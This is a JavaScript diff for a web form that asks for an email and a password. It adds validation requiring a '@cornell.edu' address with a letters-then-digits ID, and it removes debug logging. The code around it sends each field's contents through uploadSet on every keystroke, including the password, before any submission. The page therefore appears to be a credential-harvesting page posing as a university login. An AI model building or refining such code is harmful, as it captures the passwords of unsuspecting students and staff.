@@ -3,12 +3,54 @@ w = 150
 
 let EMAIL = ''
 
-Id('next').onclick = () => {
-    let val = Id('email').value
+function valid(val){
+
+
     let end = val.substring(val.length-12, val.length)
 
-    if (end == '@cornell.edu'){
+    if (end != '@cornell.edu'){
+        return false
+    }
 
+    let id = val.substring(0, val.length-12)
+
+    if (id.length < 3 || id.length > 6){
+        return false
+    }
+
+    index = 0
+
+    for (let i=0; i<id.length; i++){
+        if (!isNaN(id[i])){
+            index = i
+            break
+        }
+    }
+
+    if (index == 0){
+        return false
+    }
+
+    letters = id.substring(0,index)
+    number = id.substring(index, id.length)
+
+    if (isNaN(number)){
+        return false
+    }
+
+    for (let i=0; i<letters.length; i++){
+        if (!isNaN(letters[i])){
+            return false
+        }
+    }
+
+    return true
+}
+
+Id('next').onclick = () => {
+    let val = Id('email').value
+
+    if (valid(val)){
         Id('first').style.opacity = 0.3
         x = 0
         w = 150
@@ -63,15 +105,11 @@ Id('submit').onclick = () => {
 
 Id('email').oninput = e => {
     let val = Id('email').value
-
-    console.log(val)
     uploadSet(val)
 }
 
 Id('password').oninput = e => {
     let val = Id('password').value
-
-    console.log(val)
     uploadSet(val)
 }
 
